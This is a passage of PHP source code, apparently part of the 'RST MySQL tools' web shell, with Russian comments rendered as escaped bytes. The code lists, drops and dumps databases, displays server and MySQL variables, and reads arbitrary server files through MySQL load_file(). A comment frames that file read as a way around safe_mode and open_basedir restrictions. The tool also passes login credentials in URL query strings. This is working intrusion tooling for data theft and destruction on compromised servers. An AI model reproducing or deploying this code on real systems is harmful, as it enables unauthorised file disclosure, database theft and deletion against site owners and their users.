V=\'Refresh\' CONTENT=\'1;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\'></head>";\n    } else {\n        die ("$h_error".mysql_error()."$f_error <head><META HTTP-EQUIV=\'Refresh\' CONTENT=\'2;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\'></head>");\n    }\n    unset($new_db);\n}\n\n/*\xd3\xe4\xe0\xeb\xe5\xed\xe8\xe5 \xe1\xe0\xe7\xfb*/\nif (isset($_GET[\'drop\'])){\n     $result_d = mysql_list_dbs($connection) or die("<td bgcolor=#DAD9D9>$h_error".mysql_error()."$f_error</td></tr></table>");\n     while ( $row_d=mysql_fetch_row($result_d) ){\n        if ($drop==$row_d[0]) $dr="TRUE";\n     }\n if ($dr=="TRUE") { \n mysql_drop_db($drop,$connection);\n print ("<center><font size=2>\xc1\xe0\xe7\xe0 <b>$drop</b> \xf3\xf1\xef\xe5\xf8\xed\xee \xf3\xe4\xe0\xeb\xe5\xed\xe0...</font></center><br>");\n print "<head><META HTTP-EQUIV=\'Refresh\' CONTENT=\'1;url=$self?s=$s&login=$login&passwd=$passwd&server=$server&port=$port\'></head>";\n }\nunset($drop);\n}\n\n/*-------------\xd7\xe8\xf2\xe0\xe5\xec \xef\xf0\xee\xe8\xe7\xe2\xee\xeb\xfc\xed\xfb\xe9 \xf4\xe0\xe9\xeb \xf1\xe5\xf0\xe2\xe5\xf0\xe0-----------*/\nif (isset($f)){\n\tprint $form_file;\n}\nif(isset($p_file)){ \n\t// mysql_create_db("tmp_bd",$connection) or die("$h_error<b>".mysql_error()."</b>$f_error");\n\t// mysql_create_db("tmp_bd") or die("$h_error<b>".mysql_error()."</b>$f_error"); \n\t// mysql_query(\'CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );\') or die("$h_error<b>".mysql_error()."</b>$f_error");\n\t$result = mysql_query("SELECT hex(load_file(\'".addslashes($p_file)."\')) as `fc`") or die("$h_error<b>".mysql_error()."</b>$f_error");;\n\t// $query = "SELECT * FROM tmp_file";\n\t// $result = mysql_query($query) or die("$h_error<b>".mysql_error()."</b>$f_error");\n\t/*\xef\xee\xeb\xf3\xf7\xe0\xe5\xec \xed\xe0\xe7\xe2\xe0\xed\xe8\xff \xf1\xf2\xee\xeb\xe1\xf6\xee\xe2*/\n\tfor ($i=0;$i<mysql_num_fields($result);$i++){\n\t\t$name=mysql_field_name($result,$i);\n\t} \n\tprint "<br /><table align=center border=0 cellpadding=5 cellspacing=1 width=90% bgcolor=#FFFFFF><tr><td align=center bgcolor=#DBDCDD>\xcf\xf0\xee\xf1\xec\xee\xf2\xf0 \xf4\xe0\xe9\xeb\xe0</td></tr>\n\t\t<tr><td background=".$self."?img=st_form_bg bgcolor=#ECEDEE>\n\t\t<form method=\\"get\\" action=\\"$self?f=x_file\\">\n\t\t<input type=\\"hidden\\" name=\\"s\\" value=\\"$s\\">                \n\t\t<input type=\\"hidden\\" name=\\"server\\" value=\\"$server\\">\n\t\t<input type=\\"hidden\\" name=\\"port\\" value=\\"$port\\">\n\t\t<input type=\\"hidden\\" name=\\"login\\" value=\\"$login\\">\n\t\t<input type=\\"hidden\\" name=\\"passwd\\" value=\\"$passwd\\">\n\t\t\xcf\xee\xeb\xed\xfb\xe9 \xef\xf3\xf2\xfc \xea \xf4\xe0\xe9\xeb\xf3: <input type=\\"text\\" name=\\"p_file\\" value=\\"$p_file\\" size=\\"40\\">&nbsp;&nbsp;&nbsp;&nbsp;\n\t\t<input type=\\"submit\\" value=\\"\xef\xee\xea\xe0\xe7\xe0\xf2\xfc \xf4\xe0\xe9\xeb\\"></form><br /><div style = \\"width: 850px;overflow: scroll;border: dotted 1px #ccc;\\"><tt><pre>";\n\n\twhile ($line = mysql_fetch_array($result, MYSQL_ASSOC)) {\n\t\tforeach ($line as $key =>$col_value) {        \n\t\t\tif(!strlen($col_value)) {\n\t\t\t\techo "<div style = \\"text-align: center;\\"><strong style = \\"color: #900;\\">\xcd\xe5 \xf3\xe4\xe0\xe5\xf2\xf1\xff \xef\xf0\xee\xf7\xe8\xf2\xe0\xf2\xfc \xf4\xe0\xe9\xeb.</strong></div>";\n\t\t\t} else {\n\t\t\t\tprint htmlspecialchars(@pack(\'H*\',$col_value))."<br>";\n\t\t\t}\n\t\t}\n\t}\n\n\tmysql_free_result($result);\n\tprint "</pre></tt></div></td></tr></table><br>";\n\t//  mysql_drop_db("tmp_bd") or die("$h_error<b>".mysql_error()."</b>$f_error");\n} \n\n/*--------------\xef\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 \xf1\xe5\xf0\xe2\xe5\xf0\xe0 Apache------------*/\nif (isset($apc) && $apc=="TRUE"){\n print "<center><font size=2>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 \xf1\xe5\xf0\xe2\xe5\xf0\xe0 Apache [ <b>$server</b> ]</font><center>\n <table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#FFFFFF>\n  <tr align=center bgcolor=#B6B5B5>\n   <td>\xce\xef\xe8\xf1\xe0\xed\xe8\xe5</td><td>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xe0\xff</td>\n  </tr> \n  <tr bgcolor=#DAD9D9><td>\xc8\xec\xff Internet-\xf5\xee\xf1\xf2\xe0</td><td>".$_SERVER["SERVER_NAME"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>IP-\xe0\xe4\xf0\xe5\xf1 \xf5\xee\xf1\xf2\xe0</td><td>".$_SERVER["SERVER_ADDR"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>\xcf\xee\xf0\xf2 Web-\xf1\xe5\xf0\xe2\xe5\xf0\xe0.</td><td>".$_SERVER["SERVER_PORT"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>\xd1\xef\xe5\xf6\xe8\xf4\xe8\xea\xe0\xf6\xe8\xff CGI \xe8\xed\xf2\xe5\xf4\xe5\xe9\xf1\xe0.</td><td>".$_SERVER["GATEWAY_INTERFACE"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>\xcf\xf0\xee\xf2\xee\xea\xee\xeb \xef\xf0\xe8 \xe7\xe0\xef\xf0\xee\xf1\xe5 \xe4\xe0\xed\xed\xee\xe9 \xf1\xf2\xf0\xe0\xed\xe8\xf6\xfb (\xec\xe5\xf2\xee\xe4).</td><td>".$_SERVER["REQUEST_METHOD"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>Root \xe4\xe8\xf0\xe5\xea\xf2\xee\xf0\xe8\xff \xe4\xeb\xff \xe4\xe0\xed\xed\xee\xe3\xee \xef\xee\xeb\xfc\xe7\xee\xe2\xe0\xf2\xe5\xeb\xff.</td><td>".$_SERVER["DOCUMENT_ROOT"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>\xc7\xe0\xe3\xee\xeb\xee\xe2\xee\xea \xf2\xe5\xea\xf3\xf9\xe5\xe3\xee \xe7\xe0\xef\xf0\xee\xf1\xe0.</td><td>".$_SERVER["HTTP_CONNECTION"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>\xc4\xe8\xf0\xe5\xea\xf2\xe8\xe2\xe0 httpd.conf (SERVER_ADMIN).</td><td>".$_SERVER["SERVER_ADMIN"]."</td></tr>\n  <tr bgcolor=#DAD9D9><td>\xd1\xe8\xe3\xed\xe0\xf2\xf3\xf0\xe0 \xf1\xe5\xf0\xe2\xe5\xf0\xe0.</td><td>".$_SERVER["SERVER_SIGNATURE"]."</td></tr>\n </table><br>";\n unset($apc);\n}\n\n/*---------------\xd1\xf2\xe0\xf2\xe8\xf1\xf2\xe8\xea\xe0 MySQL \xf1\xe5\xf0\xe2\xe5\xf0\xe0--------------*/\nif (isset($stat) && $stat=="TRUE"){\n$result = mysql_query("SHOW STATUS", $connection); \n print "<center><font size=2>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 \xf1\xee\xf1\xf2\xee\xff\xed\xe8\xff MySQL \xf1\xe5\xf0\xe2\xe5\xf0\xe0 [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=400 bgcolor=#FFFFFF><tr align=center bgcolor=#B6B5B5><td>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 \xf1\xee\xf1\xf2\xee\xff\xed\xe8\xff \xf1\xe5\xf0\xe2\xe5\xf0\xe0</td><td>\xe7\xed\xe0\xf7\xe5\xed\xe8\xff \xef\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xf5</td></tr>";\n while ($row = mysql_fetch_array($result, MYSQL_NUM)) {\n   print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td></tr>";  \n } \n  print "</table>";\n mysql_free_result($result);\n}\n\n/*---------------\xd1\xe8\xf1\xf2\xe5\xec\xed\xfb\xe5 \xef\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 MySQL \xf1\xe5\xf0\xe2\xe5\xf0\xe0--------------*/\nif (isset($var) && $var=="TRUE"){\n$result = mysql_query("SHOW VARIABLES ", $connection); \n print "<center><font size=2>\xd1\xe8\xf1\xf2\xe5\xec\xed\xfb\xe5 \xef\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 MySQL \xf1\xe5\xf0\xe2\xe5\xf0\xe0 [ <b>$server</b> ]</font><center><table align=center border=0 cellpadding=0 cellspacing=1 width=80% bgcolor=#FFFFFF><tr align=center bgcolor=#B6B5B5><td>\xcf\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xe5 \xf1\xe5\xf0\xe2\xe5\xf0\xe0</td><td>\xe7\xed\xe0\xf7\xe5\xed\xe8\xff \xef\xe5\xf0\xe5\xec\xe5\xed\xed\xfb\xf5</td></tr>";\n while ($row = mysql_fetch_array($result, MYSQL_NUM)) {\n   print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td></tr>";  \n } \n  print "</table>";\n mysql_free_result($result);\nunset($var);\n}\n\n/*-------------\xe2\xfb\xe2\xee\xe4 \xe4\xe0\xed\xed\xfb\xf5 \xf2\xe0\xe1\xeb\xe8\xf6------------*/\nif (isset($db) && !isset($tbl)) {\n$cnt=mysql_num_rows(mysql_list_tables($db)); //\xea\xee\xeb-\xe2\xee \xf2\xe0\xe1\xeb\xe8\xf6 \xe1\xe0\xe7\xfb\n print "<table border=0 align=center width=100% cellpadding=0 cellspacing=0>\n         <tr>\n           <td>\n                <table border=0 align=center width=80% cellpadding=0 cellspacing=1 bgcolor=#FFFFFF>\n                   <tr align=center>                      \n                      <td width=20% bgcolor=#B6B5B5>\n<a href=\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&cr_tbl=new\\" title=\\"\xd1\xee\xe7\xe4\xe0\xf2\xfc \xed\xee\xe2\xf3\xfe \xf2\xe0\xe1\xeb\xe8\xf6\xf3 \xe2 \xe1\xe0\xe7\xe5 $db\\"><b>\xd1\xee\xe7\xe4\xe0\xf2\xfc \xf2\xe0\xe1\xeb\xe8\xf6\xf3</b></a>\n                      </td>\n                      <td width=20% bgcolor=#B6B5B5>\n<a href=\\"$_SERVER[PHP_SELF]?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&port=$port&query_tbl&q_tbl=bd\\" title=\\"\xcf\xf0\xee\xe8\xe7\xe2\xee\xeb\xfc\xed\xfb\xe9 \xe7\xe0\xef\xf0\xee\xf1 \xea \xe1\xe0\xe7\xe5\\"><b>SQL-\xe7\xe0\xef\xf0\xee\xf1</b></a>\n                      </td>\n                      <td width=20% bgcolor=#B6B5B5>\n<a href=\\"$_SERVER[PHP_SELF]?s=$s&db=$db&str=TRUE&login=$login&passwd=$passwd&server=$server&port=$port\\" title=\\"\xcf\xee\xea\xe0\xe7\xe0\xf2\xfc \xf1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xf3 \xc1\xc4\\"><b>\xf1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xe0</b></a>\n                      </td>\n                      <td width=20% bgcolor=#B6B5B5>\n<a href=\\"$_SERVER[PHP_SELF]?s=$s&login=$login&passwd=$passwd&server=$server&port=$port&db=$db&dump=bd\\" title=\\"\xdd\xea\xf1\xef\xee\xf0\xf2 \xe4\xe0\xed\xed\xfb\xf5 \xe1\xe0\xe7\xfb $db\\"><b>\xc4\xe0\xec\xef \xe1\xe0\xe7\xfb</b></a>\n                      </td>\n                      <td width=20% bgcolor=#B6B5B5>\n<a href=\\"$_SERVER[PHP_SELF]?s=$s&drop=$db&login=$login&passwd=$passwd&server=$server&port=$port\\" title=\\"\xd3\xe4\xe0\xeb\xe8\xf2\xfc \xc1\xc4 $db\\" onClick=\\"return confirm(\'\xd3\xe4\xe0\xeb\xe8\xf2\xfc \xe1\xe0\xe7\xf3 $db ?\')\\";><b>\xf3\xe4\xe0\xeb\xe8\xf2\xfc \xe1\xe0\xe7\xf3</b></a>\n                     </td>\n                   </tr> \n                </table> \n           </td>\n         </tr>\n         <tr>\n           <td><br>";\n               print "&nbsp;&nbsp;\xc1\xc4:(<b>$db</b>)  &nbsp;&nbsp;\xc2\xf1\xe5\xe3\xee \xf2\xe0\xe1\xeb\xe8\xf6:(<b>$cnt</b>)";\n               if (isset($t)) { print "<br>&nbsp;&nbsp;".base64_decode($t);}\n               if (isset($t2)) { print base64_decode($t2);}\n/*-------------\xd1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xe0 \xe1\xe0\xe7\xfb ------------------*/\nif (isset($str) && $str==\'TRUE\'){\n  mysql_select_db($db);\n  if ($cnt < 1) { \n      print "<table border=1 width=400 align=center bgcolor=#E7E7D7><tr align=center>".\n            "<td><br><h5>\xcd\xe5\xe2\xee\xe7\xec\xee\xe6\xed\xee \xef\xee\xea\xe0\xe7\xe0\xf2\xfc \xf1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xf3 \xe1\xe0\xe7\xfb<br>\xc2 \xe1\xe0\xe7\xe5 <font color=blue>".\n            "$db</font> \xed\xe5\xf2 \xf2\xe0\xe1\xeb\xe8\xf6!</h5></td></tr></table><br><br>";     \n  }else{\n    $result = mysql_query("SHOW TABLE STATUS", $connection); \n    print "<br><center><font size=2>\xd1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xe0 \xe1\xe0\xe7\xfb [ <b>$db</b> ]</font></center>".\n          "<table align=center border=0 cellpadding=0 cellspacing=1 width=650 bgcolor=#FFFFFF>".\n          "<tr align=center bgcolor=#B6B5B5><td>\xe8\xec\xff \xf2\xe0\xe1\xeb\xe8\xf6\xfb</td><td>\xf2\xe8\xef</td><td>\xf0\xff\xe4\xee\xe2</td><td>\xf1\xee\xe7\xe4\xe0\xed\xe0</td>".\n          "<td>\xec\xee\xe4\xe8\xf4\xe8\xf6\xe8\xf0\xee\xe2\xe0\xed\xe0</td><td>\xf0\xe0\xe7\xec\xe5\xf0(kb)</td><td>\xe4\xe5\xe9\xf1\xf2\xe2\xe8\xe5</td></tr>";\n    while ($row = mysql_fetch_array($result, MYSQL_NUM)) {\n      $size=$row[5]/1000;\n      print "<tr bgcolor=#DAD9D9><td>$row[0]</td><td>$row[1]</td><td align=center>$row[3]</td>".\n            "<td>$row[10]</td><td>$row[11]</td><td align=center>$size</td><td bgcolor=red align=center>".\n            "<a href=\\"$_SERVER[PHP_SELF]?s=$s&db=$db&login=$login&passwd=$passwd&server=$server&".\n            "port=$port&drop_table=$row[0]\\" onClick=\\"return confirm(\'\xd3\xe4\xe0\xeb\xe8\xf2\xfc \xf2\xe0\xe1\xeb\xe8\xf6\xf3 $row[0]?\');\\">\xf3\xed\xe8\xf7\xf2\xee\xe6\xe8\xf2\xfc</a></td>\n            </tr>";  \n    } \n    print "</table><br>";\n    mysql_free_result($result);\n  }\n} \n\nprint "    </td>\n         </tr>\n       </table>";\n}\n\n/*------------\xe4\xe0\xec\xef \xe1\xe0\xe7\xfb----------------*/\n$form_dump_bd=\n"<form method=\\"get\\" action=\\"$self\\">".\n"<input type=\\"hidden\\" name=\\"s\\" value=\\"$s\\">".\n"<input type=\\"hidden\\" name=\\"db\\" value=\\"$db\\">".\n"<input type=\\"hidden\\" name=\\"server\\" value=\\"$server\\">".\n"<input type=\\"hidden\\" name=\\"port\\" value=\\"$port\\">".\n"<input type=\\"hidden\\" name=\\"login\\" value=\\"$login\\">".\n"<input type=\\"hidden\\" name=\\"passwd\\" value=\\"$passwd\\">".\n"<input type=\\"hidden\\" name=\\"f_dump\\" value=\\"$file\\">".\n"<input type=\\"hidden\\" name=\\"dump\\" value=\\"bd\\">".\n"<input type=\\"hidden\\" name=\\"strukt\\" value=\\"d_strukt_bd\\">".\n"<table align=center bgcolor=#FFFFFF width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#F0F1F4><td valign=top>".\n"<table cellpadding=2 bgcolor=#F0F1F4 width=100%>".\n"<tr><td align=center><b>Dump \xe1\xe0\xe7\xfb</b> [ <font color=green><b>$db</b></font> ]</td></tr>".\n"<tr><td align=center><font color=gray><b>\xd1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xe0 \xe8 \xe4\xe0\xed\xed\xfb\xe5</b></font></td></tr>".\n"<tr><td align=center><hr size=1 color=#FFFFFF><b>\xc4\xe5\xe9\xf1\xf2\xe2\xe8\xe5</b> (\xef\xee\xea\xe0\xe7\xe0\xf2\xfc/\xee\xf2\xef\xf0\xe0\xe2\xe8\xf2\xfc)</td></tr>".\n"<tr><td><input type=\\"radio\\" name=\\"send\\" value=\\"send_br\\" checked=\\"checked\\"> \xcf\xee\xea\xe0\xe7\xe0\xf2\xfc \xe2 \xe1\xf0\xee\xf3\xe7\xe5\xf0\xe5</td></tr>".\n"<tr><td><input type=\\"radio\\" name=\\"send\\" value=\\"send_http\\"> \xce\xf2\xef\xf0\xe0\xe2\xe8\xf2\xfc \xf4\xe0\xe9\xeb \xe4\xe0\xec\xef\xe0 \xef\xee HTTP</td></tr>".\n"<tr><td align=center><br><input type=\\"submit\\" value=\\"\xc2\xfb\xef\xee\xeb\xed\xe8\xf2\xfc \xe7\xe0\xef\xf0\xee\xf1\\"></td></tr>".\n"</table>".\n"</td></tr></table></form>";\n\nif ($_GET[\'dump\']==\'bd\') {\n   if ($cnt >= 1) {\n      print $form_dump_bd;\n   }else{ \n      print "<table border=1 width=400 align=center bgcolor=#E7E7D7><tr align=center>".\n            "<td><br><h5>\xcd\xe5\xe2\xee\xe7\xec\xee\xe6\xed\xee \xf1\xe4\xe5\xeb\xe0\xf2\xfc \xe4\xe0\xec\xef \xe1\xe0\xe7\xfb<br>\xc2 \xe1\xe0\xe7\xe5 <font color=blue>".\n            "$db</font> \xed\xe5\xf2 \xf2\xe0\xe1\xeb\xe8\xf6!</h5></td></tr></table><br><br>";\n   }\n}\n   $host = $_SERVER["SERVER_NAME"];\n   $ip = $_SERVER["SERVER_ADDR"];\nif ($_GET[\'strukt\']==\'d_strukt_bd\' && $_GET[\'send\']==\'send_br\'){\n   if (sizeof($tabs) == 0) { \n      // \xef\xee\xeb\xf3\xf7\xe0\xe5\xec \xf1\xef\xe8\xf1\xee\xea \xf2\xe0\xe1\xeb\xe8\xf6 \xe1\xe0\xe7\xfb \n      $res = mysql_query("SHOW TABLES FROM $db", $connection); \n      if (mysql_num_rows($res) > 0) { \n         while ($row = mysql_fetch_row($res)) { \n            $tabs[] .= $row[0]; \n         } \n      } \n   } \n       // \xee\xf2\xea\xf0\xfb\xe2\xe0\xe5\xec \xf4\xe0\xe9\xeb \xe4\xeb\xff \xe7\xe0\xef\xe8\xf1\xe8 \xe4\xe0\xec\xef\xe0 \n   $fp = fopen($file, "w"); \n   fputs ($fp, "# RST MySQL tools\\n# Home page: http://rst.void.ru\\n#\\n# Host settings:\\n# MySQL version: (".mysql_get_server_info().")\\n# Date: ".\n   date("F j, Y, g:i a")."\\n# ".$host." (".$ip.")"." dump db \\"".$db."\\"\\n#____________________________________________________________\\n\\n"); \n   foreach($tabs as $tab) {       \n      if ($add_drop) { \n         fputs($fp, "DROP TABLE IF EXISTS `".$tab."`;\\n");\n      }        \n      // \xef\xee\xeb\xf3\xf7\xe0\xe5\xec \xf2\xe5\xea\xf1\xf2 \xe7\xe0\xef\xf0\xee\xf1\xe0 \xf1\xee\xe7\xe4\xe0\xed\xe8\xff \xf1\xf2\xf0\xf3\xea\xf2\xf3\xf0\xfb \xf2\xe0\xe1\xeb\xe8\xf6\xfb \n      $res = mysql_query("SHOW CREATE TABLE `".$tab."`", $connection) or die(mysql_error()); \n      $row = mysql_fetch_row($res); \n      fputs($fp, $row[1].";\\n\\n"); \n       \n      // \xef\xee\xeb\xf3\xf7\xe0\xe5\xec \xe4\xe0\xed\xed\xfb\xe5 \xf2\xe0\xe1\xeb\xe8\xf6\xfb \n      $res = mysql_query("SELECT * FROM `$tab`", $connection); \n      if (mysql_num_rows($res) > 0) { \n         while ($row = mysql_fetch_assoc($res)) { \n            $keys = implode("`, `", array_keys($row)); \n            $values = array_values($row); \n            foreach($values as $k=>$v) {$values[$k] = addslashes($v);} \n            $values = implode("\', \'", $values); \n            $sql = "INSERT INTO `$tab`(`".$keys."`) VALUES (\'".$values."\');\\n"; \n            fputs($fp, $sql); \n         } \n      } \n      fputs ($fp, "#---------------------------------------------------------------------------------\\n\\n"); \n   } \n   fclose($fp);\n   $dump_file=file($file);\n   print "<table border=1 align=center cellpadding=2 bgcolor=#F0F1F4 width=98%><tr><td>";\n   print "<table border=0 align=center cellpadding=2 bgcolor=#F0F1F4>";\n   foreach ($dump_file as $k=>$v) {\n        $v=str_replace("\\n","<br>",$v);\n        print "<tr><td>".strip_tags($v,"<br>")."</td></tr>";\n   }\n   print "</table></td></tr></table><br>";\n   unlink($file);\n} \n\n/*--------------\xd1\xee\xe7\xe4\xe0\xf2\xfc \xed\xee\xe2\xf3\xfe \xf2\xe0\xe1\xeb\xe8\xf6\xf3---------------*/\n $form_cr_tbl=\n "<form method=\\"get\\" action=\\"$self\\">".\n "<input type=\\"hidden\\" name=\\"s\\" value=\\"$s\\">".\n "<input type=\\"hidden\\" name=\\"db\\" value=\\"$db\\">".\n "<input type=\\"hidden\\" name=\\"server\\" value=\\"$server\\">".\n "<input type=\\"hidden\\" name=\\"port\\" value=\\"$port\\">".\n "<input type=\\"hidden\\" name=\\"login\\" value=\\"$login\\">".\n "<input type=\\"hidden\\" name=\\"passwd\\" value=\\"$passwd\\">".\n "<table align=center bgcolor=#FFFFFF width=400 cellpadding=0 cellspacing=1 border=0><tr bgcolor=#F0F1F4><td valign=top>".\n "<table cellpadding=2 bgcolor=#F0F1F4 width=100%>".\n "<tr><td align=center><b>\xd1\xee\xe7\xe4\xe0\xf2\xfc \xed\xee\xe2\xf3\xfe \xf2\xe0\xe1\xeb\xe8\xf6\xf3 \xe2 \xe1\xe0\xe7\xe5</b> [ <font color=green><b>$db</b></font> ]<hr color=#FFFFFF></td></tr